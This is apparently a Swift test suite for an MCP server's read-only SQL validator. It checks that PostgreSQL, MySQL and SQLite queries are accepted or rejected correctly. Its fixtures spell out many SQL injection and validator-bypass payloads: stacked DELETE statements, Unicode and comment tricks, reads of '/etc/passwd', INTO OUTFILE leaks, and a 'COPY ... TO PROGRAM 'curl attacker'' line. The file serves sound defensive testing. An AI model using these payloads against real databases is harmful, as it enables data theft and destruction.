import XCTest
@testable import BerryMCP
import BerryDriverSQLite

final class MCPReadPolicyTests: XCTestCase {
    private let policy = MCPReadPolicy()

    func testParameterizedSingleReadsAreAllowed() throws {
        let fixtures: [(MCPSQLDialect, String)] = [
            (.postgresql, "SELECT id, name FROM users WHERE id = $1"),
            (.mysql, "SELECT `semi;colon` FROM users WHERE id = ?"),
            (.sqlite, "WITH chosen AS (SELECT id FROM users WHERE name = ?) SELECT * FROM chosen"),
            (.postgresql, "VALUES ($1), ($2)"),
            (.sqlite, "PRAGMA table_info('users')"),
            (.mysql, "EXPLAIN SELECT * FROM users WHERE id = ?"),
            (.postgresql, "SELECT count(*), lower(name), coalesce(email, $1) FROM users WHERE id = $2"),
            (.sqlite, "SELECT json_extract(payload, '$.name') FROM events WHERE id = ?1"),
            (.mysql, "SELECT replace(name, ?, ?) FROM users WHERE id = ?"),
            (.mysql, "SELECT ':=' AS assignment_text"),
        ]
        for (dialect, sql) in fixtures { XCTAssertNoThrow(try policy.validate(sql, dialect: dialect), sql) }
    }

    func testCTEColumnListsAreRecognizedOnlyAtDeclarationSites() throws {
        let accepted = [
            "WITH c(id, name) AS (SELECT id, name FROM users) SELECT * FROM c",
            "WITH a(id) AS (SELECT id FROM users), b(value) AS (SELECT lower(name) FROM users) SELECT * FROM a, b",
            "WITH outer_cte(id) AS (WITH inner_cte(value) AS (SELECT lower(name) FROM users) SELECT value FROM inner_cte) SELECT * FROM outer_cte",
            "WITH RECURSIVE path(id) AS (SELECT id FROM nodes) SELECT * FROM path",
        ]
        for sql in accepted { XCTAssertNoThrow(try policy.validate(sql, dialect: .postgresql), sql) }

        let rejected = [
            "WITH c AS (SELECT 1, evil(payload) AS value FROM events) SELECT * FROM c",
            "WITH c AS (SELECT lower(name), evil(payload) FROM events) SELECT * FROM c",
            "WITH c AS (WITH d AS (SELECT evil(payload) FROM events) SELECT * FROM d) SELECT * FROM c",
        ]
        for sql in rejected { XCTAssertThrowsError(try policy.validate(sql, dialect: .postgresql), sql) }
    }

    func testQualifiedFunctionCallsFailClosedInEveryDialect() {
        let fixtures: [(MCPSQLDialect, String)] = [
            (.postgresql, "SELECT evil.lower(name) FROM users"),
            (.postgresql, "SELECT \"evil\".lower(name) FROM users"),
            (.postgresql, "SELECT evil.\"lower\"(name) FROM users"),
            (.mysql, "SELECT evil.lower(name) FROM users"),
            (.mysql, "SELECT `evil`.lower(name) FROM users"),
            (.mysql, "SELECT evil.`lower`(name) FROM users"),
            (.sqlite, "SELECT evil.lower(name) FROM users"),
            (.sqlite, "SELECT [evil].lower(name) FROM users"),
            (.sqlite, "SELECT evil.[lower](name) FROM users"),
        ]
        for (dialect, sql) in fixtures { XCTAssertThrowsError(try policy.validate(sql, dialect: dialect), sql) }
    }

    func testValidatedExecutableSQLPreservesDialectSyntaxExactly() throws {
        let fixtures: [(MCPSQLDialect, String, String)] = [
            (.postgresql, "  SELECT $1::text || 'x'  ; \n", "SELECT $1::text || 'x'"),
            (.sqlite, "\nSELECT ?1, json_extract(payload, '$.x')->>'name' FROM events\t", "SELECT ?1, json_extract(payload, '$.x')->>'name' FROM events"),
            (.mysql, " SELECT ? <=> value FROM records ", "SELECT ? <=> value FROM records"),
        ]
        for (dialect, sql, expected) in fixtures {
            XCTAssertEqual(try policy.validate(sql, dialect: dialect).normalizedSQL, expected)
        }
    }

    func testPostgresArrayBracketsCannotHideFunctions() {
        let fixtures = [
            "SELECT ARRAY[pg_read_file('/etc/passwd')]",
            "SELECT (ARRAY[pg_sleep(10)])[1]",
            "SELECT ARRAY[lo_import('/etc/hosts')]",
        ]
        for sql in fixtures { XCTAssertThrowsError(try policy.validate(sql, dialect: .postgresql), sql) }
    }

    func testMySQLRejectsBrackets() {
        XCTAssertThrowsError(try policy.validate("SELECT [load_file('/etc/passwd')]", dialect: .mysql))
    }

    func testSQLiteBracketIdentifiersStillWork() throws {
        XCTAssertNoThrow(try policy.validate("SELECT [id] FROM [orders]", dialect: .sqlite))
    }

    /// A grapheme cluster merges a combining mark onto whatever base
    /// character precedes it, including punctuation — so a tokenizer that
    /// compares `Character`s can fail to recognize a quote, semicolon, or
    /// paren immediately followed by a combining mark, while the database
    /// (which lexes by code point, not by grapheme cluster) sees the plain
    /// delimiter underneath.
    func testCombiningMarksCannotMergeWithDelimiters() {
        let fixtures: [(MCPSQLDialect, String)] = [
            (.postgresql, "SELECT 'a'\u{301}; DELETE FROM t"),
            (.mysql, "SELECT 'a'\u{301}; DELETE FROM t"),
            (.sqlite, "SELECT 'a'\u{301}; DELETE FROM t"),
            (.postgresql, "SELECT 1;\u{301} DELETE FROM t"),
            (.mysql, "SELECT 1;\u{301} DELETE FROM t"),
            (.sqlite, "SELECT 1;\u{301} DELETE FROM t"),
            (.postgresql, "SELECT pg_sleep(\u{301}1)"),
        ]
        for (dialect, sql) in fixtures { XCTAssertThrowsError(try policy.validate(sql, dialect: dialect), sql) }
    }

    func testNormalizedSQLIsUnaffectedByScalarTokenization() throws {
        let sql = "SELECT id FROM users WHERE id = $1"
        XCTAssertEqual(try policy.validate(sql, dialect: .postgresql).normalizedSQL, sql)
    }

    /// MySQL treats `#` as a line-comment starter (like `-- `) and `"..."`
    /// as a string literal, not a quoted identifier — unlike PostgreSQL and
    /// SQLite, where `"..."` always quotes an identifier. Both differences
    /// matter for the authorization boundary: an unrecognized `#` comment
    /// leaves its contents exposed to literal tokenization instead of being
    /// skipped the way MySQL skips it, and a `"..."` string's backslash
    /// escaping is exactly as session-dependent/ambiguous as `'...'`'s, so
    /// it must be rejected on the same fail-closed grounds.
    func testMySQLHashCommentIsRecognizedAsALineComment() {
        // Today (no `#` support), the comment's contents tokenize literally,
        // but the real trailing `;` still ends the statement — so this
        // must be rejected both before and after the fix, just for the
        // right structural reason (a genuine second statement) once fixed.
        XCTAssertThrowsError(try policy.validate("SELECT 1 #comment\n; DELETE FROM t", dialect: .mysql))
    }

    func testMySQLDoubleQuotedStringRejectsBackslashLikeSingleQuoted() {
        XCTAssertThrowsError(try policy.validate(#"SELECT "a\" b" FROM t"#, dialect: .mysql))
    }

    /// MariaDB's `/*M! ... */` executable comment is the same class of
    /// escape hatch as MySQL's `/*! ... */`: content inside it is inert to
    /// a validator that only skips block comments, but MariaDB executes it.
    func testMariaDBExecutableCommentIsRejected() {
        XCTAssertThrowsError(try policy.validate("SELECT 1 /*M! ; DELETE FROM users */", dialect: .mysql))
        XCTAssertThrowsError(try policy.validate("SELECT 1 /*m!50700 ; DELETE FROM users */", dialect: .mysql))
    }

    /// Dollar-quoting is PostgreSQL-only syntax, and a real PostgreSQL tag
    /// cannot start with a digit (`$1$` is a parameter reference plus a
    /// stray `$`, not a quote delimiter). A tokenizer that accepts either
    /// on any dialect, or a digit-leading tag, can be tricked into treating
    /// a real statement boundary as inert quoted content.
    func testDollarQuotingIsPostgreSQLOnlyAndTagsCannotStartWithADigit() {
        XCTAssertThrowsError(try policy.validate("SELECT $1$; DELETE FROM users$1$", dialect: .postgresql))
        XCTAssertThrowsError(try policy.validate("SELECT $$; DELETE FROM users$$", dialect: .mysql))
        XCTAssertThrowsError(try policy.validate("SELECT $$; DELETE FROM users$$", dialect: .sqlite))
        XCTAssertNoThrow(try policy.validate("SELECT $$ embedded ; UPDATE users $$", dialect: .postgresql))
    }

    /// Dollar-quote tag scanning must not accept `$` as a tag-continuation
    /// character — the tag is delimited *by* `$`, so a scanner that treats
    /// `$` as part of the tag itself walks past the real closing delimiter
    /// and (as happened in the prior fix) can end up finding a *later*,
    /// unrelated `$tag$` as the close, swallowing a real statement boundary
    /// as inert content in between.
    func testDollarQuoteTagScanningExcludesDollarItself() {
        XCTAssertThrowsError(
            try policy.validate("SELECT $t$'$t$; DELETE FROM users; SELECT $t$'$t$", dialect: .postgresql)
        )
        XCTAssertNoThrow(try policy.validate("SELECT $t$ a ; b $t$", dialect: .postgresql))
        XCTAssertNoThrow(try policy.validate("SELECT $t$ it's $t$", dialect: .postgresql))
    }

    /// MySQL's `--` comment rule requires the following scalar to be <=
    /// U+0020 (space, tab, newline, or another control character) — not
    /// any Unicode whitespace. A scanner using the broader Unicode
    /// whitespace property both under- and over-recognizes MySQL comments
    /// relative to what MySQL itself does, in both directions letting a
    /// real statement boundary hide inside what the validator (wrongly)
    /// treats as an ordinary string literal or an inert comment.
    func testMySQLDoubleDashCommentRequiresASCIIControlOrSpace() {
        XCTAssertThrowsError(
            try policy.validate("SELECT 1 --\u{1} '\n; DELETE FROM t -- '", dialect: .mysql)
        )
        XCTAssertThrowsError(
            try policy.validate("SELECT 1 --\u{A0}; DELETE FROM t", dialect: .mysql)
        )
        XCTAssertNoThrow(try policy.validate("SELECT 1 -- ok\nFROM t", dialect: .mysql))
    }

    /// Every non-ASCII scalar — combining marks, ZWJ, variation selectors,
    /// non-ASCII digits — is identifier start and continuation in every
    /// dialect, so a decorated function name is one token that fails the
    /// allowlist, rather than splitting into a plain name plus a stray
    /// token that never reads as `name(` at all and so never gets checked.
    func testDecoratedIdentifiersStayOneTokenAndFailTheAllowlist() {
        XCTAssertThrowsError(try policy.validate("SELECT pg_sleep\u{301}(1)", dialect: .postgresql))
        XCTAssertThrowsError(try policy.validate("SELECT evil\u{FE0F}(1)", dialect: .postgresql))
        XCTAssertNoThrow(try policy.validate(#"SELECT "tên" FROM t"#, dialect: .postgresql))
        XCTAssertNoThrow(try policy.validate("SELECT tên FROM t", dialect: .sqlite))
    }

    /// Discriminating fixtures the re-reviewer confirmed 4f59e05 accepted;
    /// each must be rejected by the current implementation.
    func testReReviewerDiscriminatingFixturesAreRejected() {
        for dialect in MCPSQLDialect.allCases {
            XCTAssertThrowsError(try policy.validate("SELECT 'a'\u{301}; DELETE FROM t -- '", dialect: dialect), "\(dialect)")
        }
        XCTAssertThrowsError(try policy.validate("SELECT 1 # '\n; DELETE FROM t -- '", dialect: .mysql))
        XCTAssertThrowsError(try policy.validate(#"SELECT "a\" , "; DELETE FROM t; -- ""#, dialect: .mysql))
    }

    func testCTEColumnListExemptionIsStructuralNotHeuristic() {
        // `coalesce(NULL::record) AS (a int)` is real PostgreSQL syntax — a
        // FROM-item function call with an explicit column-definition list —
        // immediately followed by `, evil(1) AS e`, a second FROM-item that
        // is a genuine, non-allowlisted function call. Both sit after the
        // main statement keyword, never inside the WITH-clause's own CTE
        // list, so neither may be exempted.
        XCTAssertThrowsError(
            try policy.validate(
                "WITH c AS (SELECT 1) SELECT * FROM coalesce(NULL::record) AS (a int), evil(1) AS e",
                dialect: .postgresql
            )
        )
    }

    /// `exemptions.insert(nameIndex)` must not happen until `AS (` is
    /// confirmed — otherwise a `name(...)` that turns out not to be a real
    /// CTE declaration (missing `AS (...)`) still ends up exempted from the
    /// function-call check.
    func testCTEExemptionIsNotRecordedBeforeASIsConfirmed() {
        XCTAssertThrowsError(try policy.validate("WITH evil(1) SELECT 1", dialect: .postgresql))
        XCTAssertThrowsError(try policy.validate("WITH a AS (SELECT 1), evil(1) SELECT 1", dialect: .postgresql))
    }

    /// `EXPLAIN WITH ...` must build the same CTE-declaration exemptions as
    /// a bare `WITH ...` statement — this worked under 4f59e05's heuristic
    /// (which did not care about statement type) and must keep working
    /// under the structural replacement, which has to look for `WITH`
    /// inside an `EXPLAIN` target rather than only at token 0.
    func testEXPLAINWithBuildsCTEExemptionsToo() {
        XCTAssertNoThrow(try policy.validate("EXPLAIN WITH c(x) AS (SELECT 1) SELECT x FROM c", dialect: .postgresql))
    }

    /// WITH-body nesting recurses one Swift call per level; an attacker
    /// supplying deeply nested `WITH (WITH (WITH (...)))` bodies must be
    /// rejected as malformed rather than risking runaway recursion.
    func testDeeplyNestedWITHBodiesAreRejectedAsMalformed() {
        let depth = 20
        var sql = (0..<depth).map { "WITH w\($0) AS (" }.joined()
        sql += "SELECT 1"
        sql += stride(from: depth - 1, through: 0, by: -1).map { ") SELECT * FROM w\($0)" }.joined()
        XCTAssertThrowsError(try policy.validate(sql, dialect: .postgresql))
    }

    private func nestedWITH(levels: Int) -> String {
        var sql = (0..<levels).map { "WITH w\($0) AS (" }.joined()
        sql += "SELECT 1"
        sql += stride(from: levels - 1, through: 0, by: -1).map { ") SELECT * FROM w\($0)" }.joined()
        return sql
    }

    /// The depth cap's boundary must be exact: the maximum accepted level
    /// of WITH-body nesting passes, and precisely one level deeper is
    /// rejected — not "somewhere well past the cap," which the round-2
    /// 20-level fixture alone cannot distinguish from an off-by-several
    /// implementation.
    func testWITHNestingDepthCapBoundaryIsExact() throws {
        XCTAssertNoThrow(try policy.validate(nestedWITH(levels: 17), dialect: .postgresql))
        XCTAssertThrowsError(try policy.validate(nestedWITH(levels: 18), dialect: .postgresql))
    }

    /// MySQL's `--` comment rule is `isspace || iscntrl` on the following
    /// byte: value <= U+0020, *or* U+007F (DEL, a control character that
    /// is not <= U+0020). The earlier `<= 0x20`-only predicate missed DEL.
    func testMySQLDoubleDashCommentRecognizesDELAsAControlCharacter() {
        XCTAssertThrowsError(
            try policy.validate("SELECT 1 --\u{7F} '\n; DELETE FROM t -- '", dialect: .mysql)
        )
        // `~` (U+007E) is neither <= U+0020 nor U+007F: `--~1` must stay
        // two minus operators, not a comment.
        XCTAssertNoThrow(try policy.validate("SELECT 1 --~1", dialect: .mysql))
    }

    /// Line comments end exactly where each engine ends them: PostgreSQL
    /// `--` at `\n` or `\r`; MySQL `--`/`#` and SQLite `--` at `\n` only.
    /// Ending a comment late hides SQL the engine executes; ending it
    /// early is equally fail-open, because text the engine still treats
    /// as comment (here a `'`) is lexed by the validator as the start of a
    /// string that swallows the real statement boundary after it.
    func testPostgreSQLLineCommentEndsAtCarriageReturn() {
        XCTAssertThrowsError(try policy.validate("SELECT 1 -- x\r; DELETE FROM t", dialect: .postgresql))
    }

    func testMySQLAndSQLiteLineCommentsDoNotEndAtCarriageReturn() {
        let fixtures: [(MCPSQLDialect, String)] = [
            (.mysql, "SELECT 1 -- x\r'\n; DELETE FROM t -- '"),
            (.mysql, "SELECT 1 # x\r'\n; DELETE FROM t -- '"),
            (.mysql, "SELECT 1 --\r'\n; DELETE FROM t -- '"),
            (.sqlite, "SELECT 1 -- x\r'\n; DELETE FROM t -- '"),
        ]
        for (dialect, sql) in fixtures { XCTAssertThrowsError(try policy.validate(sql, dialect: dialect), "\(dialect) \(sql)") }
        XCTAssertNoThrow(try policy.validate("SELECT 1 -- x\r\n", dialect: .mysql))
        XCTAssertNoThrow(try policy.validate("SELECT 1 # x\r\n", dialect: .mysql))
        XCTAssertNoThrow(try policy.validate("SELECT 1 -- x\r\n", dialect: .sqlite))
    }

    /// PostgreSQL ends the comment at `\r`, so the following `'` opens a
    /// string literal that runs to the final `'`: the engine sees one
    /// statement, `SELECT 1` followed by a string constant (a syntax
    /// error), with no statement separator outside the literal. The
    /// validator must see the same single statement with the same
    /// boundaries — the `;` and `DELETE` stay inside one string token.
    func testPostgreSQLCarriageReturnThenQuoteOpensStringLiteral() throws {
        let sql = "SELECT 1 -- x\r'\n; DELETE FROM t -- '"
        let decision = try policy.validate(sql, dialect: .postgresql)
        XCTAssertEqual(decision.statement, "SELECT")
        XCTAssertEqual(decision.normalizedSQL, sql)
    }

    /// SQLite's `$name`, `$name(...)`, `@name`, `:name` and `#name` are
    /// named-parameter/TCL-variable-reference syntax; MCP only ever binds
    /// parameters positionally with `?`/`?NNN`. SQLite's own grammar for
    /// the `(...)` suffix on these forms accepts "any text at all" without
    /// respecting quoting or nesting, so an attacker-chosen suffix can
    /// close early and expose a real statement boundary that this
    /// tokenizer would otherwise absorb as ordinary token text (`$abs(`
    /// reads as the allowlisted `ABS(` call) instead of recognizing as one
    /// opaque parameter the way SQLite does.
    func testSQLiteRejectsNamedParameterAndTCLVariableSyntax() {
        XCTAssertThrowsError(try policy.validate("SELECT $abs(') ; DELETE FROM t -- ')", dialect: .sqlite))
        XCTAssertThrowsError(try policy.validate("SELECT @abs(') ; DELETE FROM t -- ')", dialect: .sqlite))
        XCTAssertThrowsError(try policy.validate("SELECT :name", dialect: .sqlite))
        XCTAssertThrowsError(try policy.validate("SELECT #name", dialect: .sqlite))
        XCTAssertNoThrow(try policy.validate("SELECT ? , ?1", dialect: .sqlite))
    }

    /// Whitespace between tokens is ASCII only, in every dialect — every
    /// other scalar (including Unicode whitespace like U+00A0) is
    /// identifier material, consistent with round 2's "every non-ASCII
    /// scalar is identifier start/continuation." Treating U+00A0 as a
    /// separator let `\u{A0}abs(1)` tokenize as a clean, allowlisted
    /// `abs(1)` call; as identifier material, the name becomes `\u{A0}ABS`,
    /// which is not allowlisted.
    func testInterTokenWhitespaceIsASCIIOnly() {
        XCTAssertThrowsError(try policy.validate("SELECT \u{A0}abs(1)", dialect: .postgresql))
    }

    /// A `WITH` appearing deeper inside an EXPLAIN target — for example
    /// PostgreSQL's `... WITH ORDINALITY ...` table-function modifier —
    /// must not be mistaken for the target's own CTE clause. Only a `WITH`
    /// that is the very first keyword of the target (immediately after
    /// `EXPLAIN` and its own option words) introduces a CTE list; the
    /// fixture's `evil(1) AS (b int)` sits in a position that coincidence
    /// makes look like a second CTE declaration if `WITH ORDINALITY` is
    /// (wrongly) treated as opening one.
    func testEXPLAINOnlyTreatsWITHAsCTEListWhenItIsTheTargetsFirstKeyword() {
        XCTAssertThrowsError(
            try policy.validate(
                "EXPLAIN SELECT * FROM lower('x') WITH ORDINALITY AS (a int), evil(1) AS (b int) UNION SELECT 1",
                dialect: .postgresql
            )
        )
        // Round 2's EXPLAIN WITH fixture must keep working.
        XCTAssertNoThrow(try policy.validate("EXPLAIN WITH c(x) AS (SELECT 1) SELECT x FROM c", dialect: .postgresql))
    }

    func testEXPLAINDeniesBritishSpellingAnalyse() {
        XCTAssertThrowsError(try policy.validate("EXPLAIN ANALYSE SELECT 1", dialect: .postgresql))
    }

    /// Regression guards for fixtures the controller called out explicitly;
    /// each is annotated with whether it already failed closed before this
    /// round's changes.
    func testControllerCalledOutFixturesBehaveAsIntended() {
        // Already rejected: ANALYZE anywhere in the word list is denied
        // regardless of the parenthesized-options position.
        XCTAssertThrowsError(try policy.validate("EXPLAIN (ANALYZE) SELECT 1", dialect: .postgresql))
        // Already rejected: INTO is an unconditionally denied word.
        XCTAssertThrowsError(try policy.validate("SELECT 1 INTO @v", dialect: .mysql))
        // Already rejected: FOR UPDATE is matched as a subsequence; the
        // trailing SKIP LOCKED does not hide it.
        XCTAssertThrowsError(try policy.validate("SELECT * FROM t FOR UPDATE SKIP LOCKED", dialect: .postgresql))
        XCTAssertThrowsError(try policy.validate("SELECT * FROM t FOR UPDATE SKIP LOCKED", dialect: .mysql))
        // Already rejected: "MAIN" is not an allowlisted PRAGMA name, and
        // the assignment would also be rejected on its own.
        XCTAssertThrowsError(try policy.validate("PRAGMA main.user_version = 1", dialect: .sqlite))
        // Decision: rejected. `pragma_table_info` and its many siblings
        // (pragma_index_list, pragma_foreign_key_list, ...) are a large,
        // SQLite-specific family of table-valued functions; vetting each
        // one individually is out of scope here. The equivalent read-only
        // introspection is already available through the curated `PRAGMA
        // <name>` statement allowlist, so the function-call spelling stays
        // rejected as an unapproved function rather than being allowlisted.
        XCTAssertThrowsError(try policy.validate("SELECT * FROM pragma_table_info('t')", dialect: .sqlite))
    }

    func testAdversarialCorpusIsDenied() {
        let fixtures: [(MCPSQLDialect, String)] = [
            (.postgresql, "WITH changed AS (UPDATE users SET admin = true RETURNING *) SELECT * FROM changed"),
            (.postgresql, "SELECT 1; DELETE FROM users"),
            (.mysql, "SELECT 1 /* harmless */; DROP TABLE users"),
            (.postgresql, "EXPLAIN ANALYZE SELECT * FROM users"),
            (.postgresql, "CALL rotate_keys()"),
            (.mysql, "EXECUTE prepared_write"),
            (.postgresql, "SELECT * INTO secrets_copy FROM secrets"),
            (.postgresql, "SELECT * FROM users FOR UPDATE"),
            (.postgresql, "SELECT * FROM users FOR KEY SHARE"),
            (.postgresql, "SELECT * FROM users FOR NO KEY UPDATE"),
            (.postgresql, "SELECT * FROM users FOR /* lock */ KEY SHARE"),
            (.mysql, "SELECT * FROM users FOR SHARE"),
            (.mysql, "SELECT * FROM users FOR /* lock */ SHARE"),
            (.mysql, "SELECT * FROM users LOCK IN SHARE MODE"),
            (.mysql, "SELECT @current := id FROM users"),
            (.mysql, "SELECT @current : /* assignment */ = id FROM users"),
            (.postgresql, "SELECT pg_read_file('/etc/passwd')"),
            (.postgresql, "SELECT * FROM dblink('host=x', 'DELETE FROM x')"),
            (.mysql, "SELECT load_file('/etc/passwd')"),
            (.mysql, "SELECT * FROM users INTO OUTFILE '/tmp/users'"),
            (.sqlite, "PRAGMA writable_schema = ON"),
            (.sqlite, "PRAGMA journal_mode(WAL)"),
            (.sqlite, "ATTACH DATABASE '/tmp/other.db' AS other"),
            (.postgresql, "SET search_path = public"),
            (.mysql, "USE other_database"),
            (.sqlite, "BEGIN TRANSACTION"),
            (.postgresql, "COMMIT"),
            (.mysql, "START TRANSACTION"),
            // G3 gate evidence (docs/mcp-server-compatibility.md): a
            // PostgreSQL `BEGIN READ ONLY` transaction does not by itself
            // block these. `set_config`, `pg_advisory_lock`, MySQL
            // `get_lock`, and `sleep` are already covered above as function
            // calls; these three are the remaining statement forms.
            (.postgresql, "SET TRANSACTION READ WRITE"),
            (.postgresql, "SET default_transaction_read_only = off"),
            (.postgresql, "COMMIT; DELETE FROM users"),
            (.sqlite, "VACUUM"),
            (.postgresql, "DO $$ BEGIN DELETE FROM users; END $$"),
            (.mysql, "REPLACE INTO users VALUES (1)"),
            (.sqlite, "INSERT OR REPLACE INTO users VALUES (1)"),
            (.postgresql, "SELECT nextval('secret_seq')"),
            (.postgresql, "COPY users TO PROGRAM 'curl attacker'"),
            (.mysql, "SELECT sleep(30)"),
            (.mysql, "/*!50000 DELETE FROM users */ SELECT 1"),
            (.mysql, "SELECT 1 /*!50000 INTO OUTFILE '/tmp/leak' */"),
            (.postgresql, "SELECT set_config('search_path', 'attacker', false)"),
            (.postgresql, "SELECT pg_advisory_lock(42)"),
            (.postgresql, "SELECT pg_terminate_backend(42)"),
            (.mysql, "SELECT get_lock('mcp', 30)"),
            (.sqlite, "SELECT load_extension('/tmp/evil')"),
            (.postgresql, "SELECT unreviewed_extension_function($1)"),
            (.postgresql, "SELECT \"unreviewed_extension_function\"($1)"),
            (.mysql, "SELECT `unreviewed_extension_function`(?)"),
            (.postgresql, "SELECT 'ambiguous\\\\'; DELETE FROM users; -- '"),
            (.mysql, "SELECT 1 /* outer /* */; DELETE FROM users */"),
            (.mysql, "SELECT 1 --not-a-comment; DELETE FROM users"),
            (.sqlite, "SELECT 1 /* outer /* */; DELETE FROM users */"),
            (.sqlite, "SELECT"),
            (.mysql, "VALUES"),
            (.sqlite, "WHATEVER SELECT 1"),
        ]
        for (dialect, sql) in fixtures { XCTAssertThrowsError(try policy.validate(sql, dialect: dialect), sql) }
    }

    func testNaivePrefixAuthorizationWouldFailTheAdversarialGate() {
        let bypasses = [
            "SELECT 1; DELETE FROM users",
            "SELECT * INTO OUTFILE '/tmp/leak' FROM users",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT unreviewed_extension_function(1)",
        ]
        for sql in bypasses {
            XCTAssertTrue(sql.uppercased().hasPrefix("SELECT"), "Fixture must demonstrate the naive-prefix weakness")
            XCTAssertThrowsError(try policy.validate(sql, dialect: .postgresql))
        }
    }

    func testCommentsAndQuotedSemicolonsCannotConfuseStatementBoundary() throws {
        XCTAssertNoThrow(try policy.validate("/* ; DELETE */ SELECT ';not a statement' AS value -- ; DROP\n", dialect: .postgresql))
        XCTAssertThrowsError(try policy.validate("SELECT 'safe;'; /* comment */ UPDATE users SET x=1", dialect: .postgresql))
        XCTAssertNoThrow(try policy.validate("SELECT $$ embedded ; UPDATE users $$", dialect: .postgresql))
    }

    func testMalformedInputFailsClosed() {
        for sql in ["", "-- only a comment", "SELECT 'unterminated", "SELECT (1", "/* open"] {
            XCTAssertThrowsError(try policy.validate(sql, dialect: .sqlite), sql)
        }
    }

    func testSQLiteSessionReadOnlyEnforcementRejectsWrite() async throws {
        let path = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString).path
        FileManager.default.createFile(atPath: path, contents: Data())
        defer { try? FileManager.default.removeItem(atPath: path) }
        let connection = try SQLiteConnection(path: path)
        for try await _ in connection.execute("CREATE TABLE users(id INTEGER)") {}
        for try await _ in connection.execute("PRAGMA query_only = ON") {}
        var observedRead = false
        for try await event in connection.execute("SELECT 42 AS answer") {
            if case .rows(let rows) = event, !rows.isEmpty { observedRead = true }
        }
        XCTAssertTrue(observedRead, "SQLite query_only must continue to permit reads")
        do {
            for try await _ in connection.execute("INSERT INTO users VALUES (1)") {}
            XCTFail("SQLite query_only session unexpectedly permitted a write")
        } catch {
            XCTAssertTrue(String(describing: error).lowercased().contains("readonly"))
        }
        await connection.close()
    }
}
